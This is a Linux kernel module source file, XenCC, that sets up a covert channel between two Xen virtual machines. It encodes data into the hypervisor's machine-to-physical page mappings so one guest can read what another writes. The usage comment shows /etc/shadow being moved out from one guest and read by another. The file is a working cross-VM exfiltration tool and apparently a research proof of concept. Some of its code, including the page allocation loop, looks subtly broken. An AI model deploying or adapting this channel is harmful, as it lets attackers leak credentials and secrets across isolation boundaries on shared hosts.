/*
  XenCC v0.2 (12/2008)

  Copyright (C) 2008  Mickaël Salaün

  This program is free software: you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation, either version 3 of the License, or
  (at your option) any later version.

  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

/*
  How to use it?
  
  dom1:~# f=/etc/shadow
  dom1:~# dd if="$f" of=/dev/xencc obs=`ls -l "$f" | awk '{print $5}'`
  (waiting for the other guest...)
  
  dom2:~# cat /dev/xencc > data
 */

#include <linux/module.h>
#include <linux/miscdevice.h>
#include <linux/uaccess.h>
#include <linux/mm.h>
#include <linux/wait.h>


#define DEV_NAME "xencc"

MODULE_LICENSE("GPL");
MODULE_AUTHOR ("Mickaël Salaün");
MODULE_DESCRIPTION ("Create /dev/" DEV_NAME " to communicate with an other guest through a Xen covert channel.");


// comment this for the second guest !
#define XENCC_ME_FIRST

// better with @ > PAGE_SHIFT bits (but not tactful)
#define XENCC_TAGS_1 {123456, 13641, 1616}
#define XENCC_TAGS_2 {151651, 1416, 469564}

#ifdef XENCC_ME_FIRST
#define XENCC_TAGS_A XENCC_TAGS_1
#define XENCC_TAGS_B XENCC_TAGS_2
#define XENCC_ME 1
#define XENCC_OTH 2
#else
#define XENCC_TAGS_A XENCC_TAGS_2
#define XENCC_TAGS_B XENCC_TAGS_1
#define XENCC_ME 2
#define XENCC_OTH 1
#endif

#if defined(__i386__)
#define ADDR_LENGTH sizeof(unsigned long)
#else
#error "Unsupported architecture"
#endif

#define XENCC_DATA_PAGES 1
#define XENCC_DATA_SIZE (XENCC_DATA_PAGES * ADDR_LENGTH)

#define XENCC_VALINIT 0

//#define XENCC_WAIT_TIME msecs_to_jiffies(1)
#define XENCC_WAIT_TIME 1


#define MFN_START 0
#define MFN_END 0x00400000

//#define MSG_TYPE_HEXA

static unsigned char xencc_data[XENCC_DATA_SIZE];
static unsigned int xencc_data_size;

static struct page *xencc_pages;
static int xencc_pages_nb;

unsigned long *mfn_allocated;

// other's tags
static unsigned long pfn_oth_header_tag[] = XENCC_TAGS_A;
#define PFN_OTH_HEADER_TAG_SIZE (sizeof(pfn_oth_header_tag) / ADDR_LENGTH)

// our's tags
static unsigned long pfn_my_header_tag[] = XENCC_TAGS_B;
#define PFN_MY_HEADER_TAG_SIZE (sizeof(pfn_my_header_tag) / ADDR_LENGTH)
#define PFN_MY_HEADER_SIZE (3 + sizeof(pfn_my_header_tag) / ADDR_LENGTH)

#define PFN_HEADER_TAG_SIZE PFN_MY_HEADER_TAG_SIZE
#define PFN_HEADER_SIZE PFN_MY_HEADER_SIZE

// without ack field
#define PFN_HEADER_ARS_SIZE (PFN_MY_HEADER_SIZE - PFN_MY_HEADER_TAG_SIZE)

typedef struct 
{
    unsigned long tag[PFN_HEADER_TAG_SIZE];
    unsigned long ack;
    unsigned long rest;
    unsigned long size;
    unsigned long data[XENCC_DATA_PAGES];
} rb_t;

static unsigned long rb_mfn, oth_mfn = 0;
static unsigned long rb_ack = 0; // 0 = RAZ ; 1 = pile ; 2 = face
static unsigned long rb_rest = 0, rb_size;
static unsigned long oth_ack, oth_rest, oth_size;


//#define DBG(...) printk(KERN_DEBUG DEV_NAME " " __VA_ARGS__);
#define DBG(...) /* */


static int xencc_open(struct inode *inode, struct file *filp)
{
    DBG("open\n");
    return 0;
}

static int xencc_release(struct inode *inode, struct file *filp)
{
    DBG("release\n");
    return 0;
}

static unsigned long allocate_mfn(unsigned int nb_pages)
{
    int order;
    struct page *pt;
    unsigned long pfn, mfn, i;
    
    for(order = 0; nb_pages > 0; order++)
        nb_pages >>= 1;
    DBG("order: %d\n", order);

    // sauvons les mfn !
    mfn_allocated = kmalloc(nb_pages * ADDR_LENGTH, GFP_HIGHUSER);
    
    // info : order < MAX_ORDER (soit 11 suivant la config) => max nb_pages = 1023
    pt = alloc_pages(__GFP_REPEAT | __GFP_NOMEMALLOC | __GFP_ZERO | GFP_HIGHUSER, order);
    if(pt == NULL)
    {
        printk(KERN_ALERT DEV_NAME " %s[%d]: page allocation failed with order %d\n",
               __FUNCTION__,
               __LINE__,
               order);
    
        return 0;
    }
    xencc_pages = pt;
    xencc_pages_nb = order;
    DBG("alloc_pages: %p\n", pt);
    
    pfn = page_to_pfn(pt);
    DBG("page_to_pfn: %08x\n", (unsigned int)pfn);
    
    mfn = pfn_to_mfn(pfn);
    DBG("pfn_to_mfn: %08x\n", (unsigned int)mfn);
    
    for(i = 0; mfn < mfn + nb_pages; mfn++, i++)
    {
        mfn_allocated[i] = mfn_to_pfn(mfn);
        DBG("sauv_page %08x\n", (unsigned int)mfn_allocated[i]);
    }
    
    return mfn;
}


static void mfn_cc_clean(void)
{
    int i, nb_success;
    const int max = sizeof(rb_t)/ADDR_LENGTH;
    mmu_update_t upd[max];
    DBG("cleaning\n");
    
    for(i = 0; i < max; i++)
    {
        upd[i].ptr = ((rb_mfn + i) << PAGE_SHIFT) | MMU_MACHPHYS_UPDATE;
        upd[i].val = mfn_allocated[i];
        DBG("pfn%d: %08lx -> %08lx\n", i, (unsigned long)(upd[i].ptr >> PAGE_SHIFT), (unsigned long)upd[i].val);
    }
    HYPERVISOR_mmu_update(upd, max, &nb_success, DOMID_SELF);
    
    if(nb_success != max)
    {
        printk(KERN_ALERT DEV_NAME " %s[%d]: clean failed (%d)\n",
               __FUNCTION__,
               __LINE__,
               nb_success);
    }
    
    DBG("free %p (%d)\n", xencc_pages, xencc_pages_nb);
    xencc_pages_nb = 0;
    
    kfree(mfn_allocated);
}

// MFN Cover Channel Write
static unsigned char mfn_cc_write(unsigned char *data, unsigned long size, unsigned long rest)
{
    unsigned int nb_success;
    unsigned long i, j, max = size / ADDR_LENGTH + (size % ADDR_LENGTH ? 1 : 0);
    mmu_update_t upd[max + PFN_HEADER_ARS_SIZE];
    
    DBG("write to guest %d\n", XENCC_OTH);
    DBG("mfn_cc_write %p, %lu, %lu\n", data, size, rest);
    DBG("max %lu\n", max);
    
    //mfn_cc_clean();
    
    for(i = 0; i < max + PFN_HEADER_ARS_SIZE; i++)
    {
        upd[i].ptr = (((rb_mfn + PFN_MY_HEADER_TAG_SIZE + i) << PAGE_SHIFT) | MMU_MACHPHYS_UPDATE);
    
        switch(i) {
        case 0: // ~ack
            rb_ack = (rb_ack == 1) ? 2 : 1;
            upd[i].val = rb_ack;
            break;
            
        case 1: // rest
            rb_rest = rest;
            upd[i].val = rb_rest;
            break;
            
        case 2: // size
            rb_size = size;
            upd[i].val = rb_size;
            break;
            
        default:
            upd[i].val = XENCC_VALINIT;
            for(j = 0; j < ADDR_LENGTH && (i - PFN_HEADER_ARS_SIZE) * ADDR_LENGTH + j < size; j++)
                upd[i].val += (data[(i - PFN_HEADER_ARS_SIZE) * ADDR_LENGTH + j]) << (j * 8); // little-endian
        }
        DBG("pfn%lu: %08lx -> %08lx\n", i, (unsigned long)(upd[i].ptr >> PAGE_SHIFT), (unsigned long)upd[i].val);
    }
    
    HYPERVISOR_mmu_update(upd, PFN_HEADER_ARS_SIZE + max, &nb_success, DOMID_SELF);
    DBG("nb_success:%d length:%lu\n", nb_success, max + PFN_HEADER_ARS_SIZE);
    
    if(nb_success != PFN_HEADER_ARS_SIZE + max)
        return 0;
    
    return 1;
}


static unsigned long init_ring_buffer(void)
{
    int nb_success, i;
    unsigned long mfn;
    const int max = sizeof(rb_t)/ADDR_LENGTH;
    mmu_update_t upd[max];
    
    mfn = allocate_mfn(max);
    DBG("allocate_mfn : %08lx\n", mfn);
    DBG("max %d\n", max);
    
    for(i = 0; i < max; i++)
    {
        upd[i].ptr = ((mfn + i) << PAGE_SHIFT) | MMU_MACHPHYS_UPDATE;
        
        if(i < PFN_MY_HEADER_TAG_SIZE)
            upd[i].val = pfn_my_header_tag[i];
        else
            switch(i) {
            case PFN_MY_HEADER_TAG_SIZE: // ack
                upd[i].val = 0;
                break;
                
            case PFN_MY_HEADER_TAG_SIZE + 1: // rest
                upd[i].val = 0;
                break;
                
            case PFN_MY_HEADER_TAG_SIZE + 2: // size
                upd[i].val = 0;
                break;
                
            default: // data
                upd[i].val = 0;
            }
        DBG("pfn%d: %08lx -> %08lx\n", i, (unsigned long)(upd[i].ptr >> PAGE_SHIFT), (unsigned long)upd[i].val);
    }
    
    HYPERVISOR_mmu_update(upd, max, &nb_success, DOMID_SELF);
    DBG("nb_success: %d\n", nb_success);
    
    if(nb_success != max)
        return 0;
    
    rb_mfn = mfn;
    DBG("rb_mfn %08lx\n", rb_mfn);
    return mfn;
}


#define PFN_EXTRACT(pfn, nb) (unsigned char)(pfn >> (nb * 8))


static unsigned char pfn_tag_find(void)
{
    unsigned char find = 0, prev = 0;
    unsigned long mfn, pfn, tag_id = 0;
    
    DBG("pfn_find_tag\n");
    
    for(mfn = oth_mfn; mfn < MFN_END && find != 2; mfn++)
    {
        if(prev == 1) {
            mfn = MFN_START;
            prev = 2;
        }
        
        pfn = mfn_to_pfn(mfn);
        if(!find && pfn == pfn_oth_header_tag[tag_id]) {
            DBG("mfn %p : %p (%d)\n", (void *)mfn, (void *)pfn, (int)tag_id);
            if(tag_id == PFN_OTH_HEADER_TAG_SIZE - 1) {
                find = 1;
                prev = 2;
            } else {
                tag_id++;
            }
        } else {
            if(prev == 0) {
                prev = 1;
                DBG("re-searching tag...\n");
            } else {
                if(find == 0)
                    tag_id = 0;
                else {
                    DBG("find tag!\n");
                    oth_mfn = mfn - PFN_OTH_HEADER_TAG_SIZE;
                    DBG("oth_mfn %08lx\n", oth_mfn);
                    find = 2;
                }
            }
        }
    }

    return find;
}


static void pfn_oth_header(void)
{
    unsigned long mfn;
    
    mfn = oth_mfn + PFN_OTH_HEADER_TAG_SIZE;
    oth_ack = mfn_to_pfn(mfn);
    oth_rest = mfn_to_pfn(++mfn);
    oth_size = mfn_to_pfn(++mfn);
}

static void pfn_rb_data(void)
{
    unsigned int i;
    unsigned long mfn, pfn, end = MFN_END, size = oth_size;
    xencc_data_size = 0;
    
    mfn = oth_mfn + PFN_HEADER_SIZE;
    end = mfn + size / ADDR_LENGTH + ((size % ADDR_LENGTH) ? 1 : 0);
    
    for(; mfn < end; mfn++)
    {
        pfn = mfn_to_pfn(mfn);
        
        if(size >= ADDR_LENGTH)
        {
#ifdef MSG_TYPE_HEXA
            if(xencc_data_size + ADDR_LENGTH * 4 <= XENCC_DATA_SIZE)
            {
                snprintf(xencc_data + xencc_data_size, XENCC_DATA_SIZE - xencc_data_size, "\\x%02x\\x%02x\\x%02x\\x%02x", PFN_EXTRACT(pfn, 0), PFN_EXTRACT(pfn, 1), PFN_EXTRACT(pfn, 2), PFN_EXTRACT(pfn, 3));
                xencc_data_size += ADDR_LENGTH * 4;
            }
#else
            if(xencc_data_size + ADDR_LENGTH <= XENCC_DATA_SIZE)
            {
                *(unsigned long *)(xencc_data + xencc_data_size) = pfn;
                xencc_data_size += ADDR_LENGTH;
            }
#endif
            size -= ADDR_LENGTH;
        } else {
            for(i = 0; size > 0 && i < ADDR_LENGTH; i++, size--)
            {
#ifdef MSG_TYPE_HEXA
                if(xencc_data_size + 4 <= XENCC_DATA_SIZE)
                {
                    snprintf(xencc_data + xencc_data_size, XENCC_DATA_SIZE - xencc_data_size, "\\x%02x", PFN_EXTRACT(pfn, i));
                    xencc_data_size += 4;
                }
#else
                if(xencc_data_size + 1 <= XENCC_DATA_SIZE)
                {
                    xencc_data[xencc_data_size] = PFN_EXTRACT(pfn, i);
                    xencc_data_size++;
                }
#endif
            }
        }
    }
}


static unsigned char pfn_ack(void)
{
    int nb_success;
    mmu_update_t upd[1];
    
    DBG("pfn_ack\n");
    
    rb_ack = oth_ack;
    
    upd[0].ptr = ((rb_mfn + PFN_MY_HEADER_TAG_SIZE) << PAGE_SHIFT) | MMU_MACHPHYS_UPDATE;
    upd[0].val = rb_ack;
    HYPERVISOR_mmu_update(upd, 1, &nb_success, DOMID_SELF);
    DBG("ACK %lu\n", oth_ack);
    DBG("nb_success: %d\n", nb_success);
    
    if(nb_success != 1)
        return 0;
    return 1;
}


static ssize_t xencc_read(struct file *filep, char *buff, size_t count, loff_t *offp)
{
    DECLARE_WAIT_QUEUE_HEAD(wq);
    
    DBG("read from guest %d\n", XENCC_OTH);
    DBG("read offp %lld\n", *offp);
    
    if(!pfn_tag_find()) {
        DBG("find nothing\n");
        return 0;
    }
    
    pfn_oth_header();
    DBG("oth_header ack:%lu rest:%lu size:%lu\n", oth_ack, oth_rest, oth_size);
    
    if(oth_size != 0 || oth_rest != 0) {
        while(oth_ack == rb_ack) {
            DBG("waiting...\n");
            wait_event_timeout(wq, 0, XENCC_WAIT_TIME);
            pfn_oth_header();
        }

        pfn_rb_data();
        
        // ack
        pfn_ack();
    
        if(copy_to_user(buff, xencc_data, xencc_data_size) != 0)
        {
            printk(KERN_ALERT DEV_NAME " %s[%d]: kernel -> userspace copy failed\n",
                   __FUNCTION__,
                   __LINE__);
            return -EINVAL;
        }
        DBG("xencc_data_size %d\n", xencc_data_size);
        
        return xencc_data_size;
    }
    
    return 0;
}


unsigned char wait_read(void)
{    
    DECLARE_WAIT_QUEUE_HEAD(wq);
    
    do {
        pfn_tag_find();
        
        if(oth_mfn != 0)
            pfn_oth_header();
        
        if(oth_ack != rb_ack) {
            wait_event_timeout(wq, 0, XENCC_WAIT_TIME);
        }
        
    } while(oth_ack != rb_ack);
    
    DBG("RST OK\n");

    return 1;
}

static ssize_t xencc_write(struct file *filep, const char *buff, size_t count, loff_t *offp)
{
    unsigned int i;
    unsigned int nb_success;
    unsigned long mfn;
    mmu_update_t upd[3];
    DBG("xencc_write count:%d *offp:%lld offp:%p\n", (unsigned int)count, (long long)(*offp), offp);
    
	if(copy_from_user(xencc_data, buff, XENCC_DATA_SIZE))
    {
        printk(KERN_ALERT DEV_NAME " %s[%d]: userspace -> kernel copy failed\n",
               __FUNCTION__,
               __LINE__);
        return -EINVAL;
    }
    
    if(!mfn_cc_write((unsigned char *)xencc_data, (count > XENCC_DATA_SIZE) ? XENCC_DATA_SIZE : count, (count > XENCC_DATA_SIZE) ? count - XENCC_DATA_SIZE : 0))
    {
        printk(KERN_ALERT DEV_NAME " %s[%d]: MFN copy failed\n",
               __FUNCTION__,
               __LINE__);
        return -EINVAL;
    }
    DBG("write\n");
    wait_read();
    DBG("write new\n");
    
    if(count <= XENCC_DATA_SIZE) { // ack de fin
        
        for(mfn = rb_mfn + PFN_MY_HEADER_TAG_SIZE, i = 0; mfn < rb_mfn + PFN_MY_HEADER_SIZE; mfn++, i++)
        {
            switch(i) {
            case 0: // ack toggle
                rb_ack = (rb_ack == 1) ? 2 : 1;
                upd[i].val = rb_ack;
                break;
            
            case 1: // rest
                rb_rest = 0;
                upd[i].val = rb_rest;
                break;
            
            case 2: // size
                rb_size = 0;
                upd[i].val = rb_size;
                break;
            }
            upd[i].ptr = (mfn << PAGE_SHIFT) | MMU_MACHPHYS_UPDATE;
        }
        
        HYPERVISOR_mmu_update(upd, 3, &nb_success, DOMID_SELF);
        
        return count;
    }
    
    return XENCC_DATA_SIZE;
}


static struct file_operations xencc_fops = {
    .owner = THIS_MODULE,
    .read = xencc_read,
    .write = xencc_write,
    .open = xencc_open,
    .release = xencc_release,
};

static struct miscdevice xencc_dev = {
    .minor = MISC_DYNAMIC_MINOR,
    .name = DEV_NAME,
    .fops = &xencc_fops,
};


static int xencc_init(void)
{
    int ret = 0;
    ret = misc_register(&xencc_dev);
    if(ret)
    {
        printk(KERN_ALERT DEV_NAME " %s[%d]: unable to register device (%d)\n",
               __FUNCTION__,
               __LINE__,
               ret);
        return ret;
    }
    DBG("loaded guest %d\n", XENCC_ME);
    
    xencc_pages_nb = 0;
    
    init_ring_buffer();
    
    return 0;
}

static void xencc_exit(void)
{
    if(misc_deregister(&xencc_dev))
        printk(KERN_ALERT DEV_NAME " %s[%d]: unable to unregister device\n",
               __FUNCTION__,
               __LINE__);
    
    mfn_cc_clean();
    DBG("unloaded\n");
}

module_init(xencc_init);
module_exit(xencc_exit);
